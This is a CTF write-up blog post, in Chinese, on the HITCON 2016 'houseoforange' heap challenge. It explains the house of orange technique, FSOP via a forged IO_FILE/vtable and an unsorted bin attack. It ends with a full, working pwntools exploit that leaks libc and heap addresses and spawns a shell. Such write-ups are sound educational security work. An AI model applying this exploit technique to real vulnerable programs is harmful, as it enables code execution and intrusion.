# houseoforange_hitcon_2016



### 总结

根据本题，学习与收获有很多，因为本题涉及到的知识点很多，无法一一详述。主要的收获有：
- `house of orange`利用一般发生在程序没有`free`函数的情况下，需要伪造`top chunk`的`size`，下一次分配超过伪造的大小的`chunk`的时候，就会把`old top chunk`释放掉，放置在`unorted bin`中。
- 伪造`top chunk`的`size`需要注意的几点有：
  - `size`必须要对其到内存页，就是分配的内存大小加上`top chunk size`，一定是`0x1000`的倍数。
  - `pre_inuse`位要置为`1`
  - `size`不能小于最小的`chunk`大小
- `IO_FILE`利用时，在`libc`版本低于`2.27`的时候，可以利用调用链`malloc_printerr->_libc_message->abort->_IO_flush_all_lockup->_IO_overflow`，根据条件伪造`IO_FILE`结构，`vtable`表，触发`system(/bin/sh)`或者`one_gadget`。
- 可利用`unsorted bin attack`修改`_IO_list_all`指针指向，这个是时候，`smallbin(0x60)`地址就是前一个假的`IO_FILE`的`chain`指针内容。在`libc-2.23.so`中，伪造得到的`fpchain`为：`main_arena + 0x88`--->`smallbin[0x60]`
- 想要在堆上留下堆地址，需要利用到`largebin`，存储`largebin`的堆头的时候，会在`fd_nextsize`或`bk_nextsize`上留下堆地址。

<!-- more -->

### 题目分析

题目环境为`ubuntu 16.04`，`libc-2.23.so`。

#### checksec

![image-20210424103609381](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424103609381.png)

保护全部拉满！

#### 函数分析

##### main

![image-20210424103850789](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424103850789.png)

可以看到，典型的菜单题。接下来进`menu`看看，有哪些选项。

##### menu

![image-20210424104001939](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424104001939.png)

`3`个选项，依次看看

##### build_house

![image-20210424104101719](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424104101719.png)



![image-20210424104124965](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424104124965.png)

因为我已经建立好了结构体，所以显示的都是`price`和`color`之类有属性的变量，简单梳理一下关键流程：

- 调用`build_house`次数限制为`4`次

- `malloc(0x10) ---> chunk A`，用来管理`house`
- `malloc(input_size) ---> chunk B`，其中，$input_size \in [0, 4096]$，用来存储`name`
- `read(0, B, input_size)`，读取用户输入
- `calloc(0x8) ---> chunk C`，用来存储`price`和`color`，这俩加起来才占用`8`个字节
- `A[0] = C`，`A[1] = B`，`C[0] = (price | color)`
- `cur_house_ptr`置为`chunk A`的`mem_ptr`地址



##### see_house

![image-20210424110109650](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424110109650.png)

需要注意的是：只能打印当前`house`的信息，没有提供数组索引之类的东西。

##### upgrade_house

![image-20210424110441765](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424110441765.png)

简单梳理一下主要流程：

- 限制`upgrade_house`次数为`3`次
- 修改当前`house`，获取用户输入大小`alter_size`
- `read(0, house->name, alter_size)`，可以溢出修改

#### 漏洞点

分析完主要函数后，漏洞点很明显。有且只有一个漏洞，就是在`upgrade_house`的时候，可以溢出修改`house_name`对应的`chunk`内容。

![image-20210424111149708](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424111149708.png)

需要注意的是，这里的堆溢出，只能修改`top_chunk`，因为没有提供堆数组和索引。还有，将申请的大小限制在`0x1000`内，是为了避免使用`house of force`之类的攻击。同时，题目没有提供释放`chunk`的函数，没有`free`的话，基本无法构造堆布局。本题，基本上把利用方式限制在了`house of orange`。

### 利用思路

#### 知识点

##### house of orange

**1、利用条件**

- 题目中没有给`free`之类的接口
- 可以修改`top_chunk`的`size`域

**2、利用方法**

- 溢出修改`top chunk`的`size`，注意，这里需要滿足一些检查条件
- 下次申请超过`top_chunk size`大小的`chunk`

**3、攻击效果**

- 把原来的`top_chunk`放置在`unosrted bin`中

##### FSOP

其实`FSOP`的利用方式有很多，结合不同的版本，不同的调用流程，攻击方法也不一样。这里主要谈一下`64`位下，`libc-2.23.so`中伪造`IO_FILE`结构和`vtable`，触发`IO_flush_all_lockup`刷新所有流进行攻击的方式。

**1、IO_FILE结构**

```
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

`vtable`的函数指针为：

```c
const struct _IO_jump_t _IO_wstrn_jumps attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

`malloc_printerr`最终调用到`IO_flush_all_lock`，源码位于`libio\vswprintf.c:795`

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  // 刷新所有的文件流
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )// 前面的或语句为真的时候，才会执行到_IO_OVERFLOW(fp, EOF)
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
    ······
```

要想执行到`_IO_OVERFLOE`，要么滿足`fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`，要么滿足`_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`，一般来说，前面的条件好构造一点。

##### unsorted bin attack

这个攻击方式不用细说，这里关注的有两点：

- 如果`main_arena + 88`作为文件流地址，那么它的`chain`指针对应的是`smallbin[0x60]`。

- 如果申请的大小在`largebin`的范围内，那么在解链`unsorted bin`的时候，会先把`unsorted bin chunk`放在`large bin`中，就会在`fd_nextsize`和`bk_nextsize`上留下堆地址

  ```c
  /* place chunk in bin */
  
            if (in_smallbin_range (size))
              {
                victim_index = smallbin_index (size);
                bck = bin_at (av, victim_index);
                fwd = bck->fd;
              }
            else
            {
                ······
                // 这里会被置为，留下堆地址
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
  ```

#### 利用过程

步骤：

- `build_house(0x10) chunk A`
- `ugrade_house(A)`，修改`top_chunk`的`size`域，为`house of orange`做准备。经过计算，这里修改为`0xfa1`
- `build_house(0x1000) chunk B`，触发`free(old_top_chunk)`，得到一块`unsorted bin chunk`
- `build_house(0x400, name="a" * 8)`，利用残留的指针泄露出`libc`地址
- `upgrade_house(B, name="a"*0x10)`，利用残留的指针泄露出`heap`地址
- `upgrade_house(B)`，触发`unsorted bin attack`，并修改`unsortedbin chunk`的`size`为`0x61`，同时伪造好`IO_FILE`结构和`vtable`表

### EXP

#### 调试过程

- 1、定义好各个函数

  ```python
  def build_house(length:int, name, price:int=0xff, color:int=1):
      sh.sendlineafter("Your choice : ", "1")
      sh.sendlineafter("Length of name :", str(length))
      sh.sendafter("Name :", name)
      sh.sendlineafter("Price of Orange:", str(price))
      sh.sendlineafter("Color of Orange:", str(color))
      sh.recvuntil("Finish\n")
  
      
  def see_house():
      sh.sendlineafter("Your choice : ", "2")
      name_msg = sh.recvline_startswith("Name of house : ")
      price_msg = sh.recvline_startswith("Price of orange : ")
      log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
      return name_msg, price_msg
  
  
  def upgrade_house(length:int, name, price:int=0xff, color:int=1):
      sh.sendlineafter("Your choice : ", "3")
      sh.sendlineafter("Length of name :", str(length))
      sh.sendafter("Name:", name)
      sh.sendlineafter("Price of Orange: ", str(price))
      sh.sendlineafter("Color of Orange: ", str(color))
      sh.recvuntil("Finish\n")
  ```

- 1、修改`top chunk`的`size`，触发`house of orange`

  ```python
  # change the size of top_chunk to 0xfa1
  upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))
  
  # house of orange
  build_house(0x1000, "cccc")
  ```

  ![image-20210424131633824](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131633824.png)

- 2、泄露出`libc`地址和`heap`地址

  ```python
  build_house(0x400, b"a" * 8)
  msg, _ = see_house()
  leak_libc_addr = msg[0x18: 0x18+6]
  leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))
  
  LOG_ADDR("leak_libc_addr", leak_libc_addr)
  libc_base_addr = leak_libc_addr - main_arena_offset - 1640
  LOG_ADDR("libc_base_addr", libc_base_addr)
  io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]
  
  upgrade_house(0x10, "a" * 0x10)
  msg, _ = see_house()
  heap_addr = msg[0x20:0x26]
  heap_addr = u64(heap_addr.ljust(8, b"\x00"))
  LOG_ADDR("heap_addr", heap_addr)
  ```

  ![image-20210424131739783](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131739783.png)

  ![image-20210424131803079](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131803079.png)

- 3、触发`unsortedbin attack`，并伪造`IO_FILE`结构，刷新流拿到`shell`

  ```python
  payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                  0x400 * "\x00",
                  "/bin/sh\x00", 
                  0x61,
                  0, 
                  io_list_all_addr-0x10,
                  0, 
                  0x1,  # _IO_write_ptr
                  0xa8 * b"\x00",
                  heap_addr+0x10
                  )
  upgrade_house(0x600, payload)
  sh.sendlineafter("Your choice : ", "1")
  sh.interactive()
  ```

  ![image-20210424132343300](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132343300.png)

  ![image-20210424132411045](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132411045.png)

  ![image-20210424132515511](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132515511.png)

  可以看到，已经执行了`system(/bin/sh)`，拿到了`shell`。

  这里调试的时候，不小心从`opne-wsl.exe`退出了，又重新`attach`上去，所以截图会看上不不一样。

#### 完整exp

```python
from pwn  import *
import functools

sh = process("./houseoforange_hitcon_2016")
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20

libc = ELF("libc-2.23.so")

def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")

build_house(0x10, "aaaa")

# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")

# leak addr
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr)

payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                0x400 * "\x00",
                "/bin/sh\x00", 
                0x61,
                0, 
                io_list_all_addr-0x10,
                0, 
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                )
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-04-24-houseoforange-hitcon-2016/  

